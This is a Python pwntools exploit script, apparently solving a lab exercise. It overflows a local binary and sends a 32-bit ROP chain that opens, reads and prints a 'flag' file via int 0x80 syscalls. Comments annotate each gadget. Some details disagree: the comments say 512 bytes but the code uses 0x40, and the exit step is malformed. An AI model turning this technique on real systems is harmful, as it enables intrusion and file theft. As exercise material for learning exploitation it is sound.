from pwn import *
import os

os.chdir("/home/lab1/task2")
context.update(arch='i386', os='linux')

p = process("./target")
print(p.recvuntil('Password:'))

payload = cyclic(cyclic_find(0x6161616c))

pop_eax = p32(0x0804896d)
pop_ecx_edx = p32(0x08048974)
pop_ebx = p32(0x08048575)
data_addr = p32(0x0804c000)
flag_str_loc = p32(0x080493f8 + 0x8)

open_arg = b"\x05" + b"\x00" * 3
read_arg = b"\x03" + b"\x00" * 3
write_arg = b"\x04" + b"\x00" * 3
exit_arg = b"\x01" + b"\x00" * 3
buff_size = b"\x40" + b"\x00" * 3
fd_num = b"\x03" + b"\x00" * 3
stdout = b"\x01" + b"\x00" * 3
null_word = b"\x00" * 4

int_to_kernel = p32(0x0804897b)

payload = b"\x0A" * 44
payload += pop_eax + open_arg + pop_ecx_edx + null_word + null_word + pop_ebx + flag_str_loc + int_to_kernel
payload += pop_eax + read_arg + pop_ecx_edx + data_addr + buff_size + pop_ebx + fd_num + int_to_kernel
payload += pop_eax + write_arg + pop_ecx_edx + data_addr + buff_size + pop_ebx + stdout + int_to_kernel
payload += pop_eax + exit_arg + null_word + int_to_kernel

# print(payload)

p.sendline(payload)
p.interactive()

# 0x0804896d        pop eax; ret;
# 0x00000005        argument for open
# 0x08048974        pop ecx; pop edx; ret;
# 0x00000000        RO
# 0x00000000        No flags
# 0x08048575        pop ebx; ret;
# 0x080493f8 + 0x8  Location of "flag"
# 0x0804897b        int 0x80; ret;

# 0x0804896d        pop eax; ret;
# 0x00000003        argument for read
# 0x08048974        pop ecx; pop edx; ret;
# 0x0804c000        Location of data section for process
# 0x00000200        512 bytes
# 0x08048575        pop ebx; ret;
# 0x00000003        New FD
# 0x0804897b        int 0x80; ret;

# 0x0804896d        pop eax; ret;
# 0x00000004        argument for write
# 0x08048974        pop ecx; pop edx; ret;
# 0x0804c000        Location of data section for process
# 0x00000200        512 bytes
# 0x08048575        pop ebx; ret;
# 0x00000001        STDOUT
# 0x0804897b        int 0x80; ret;
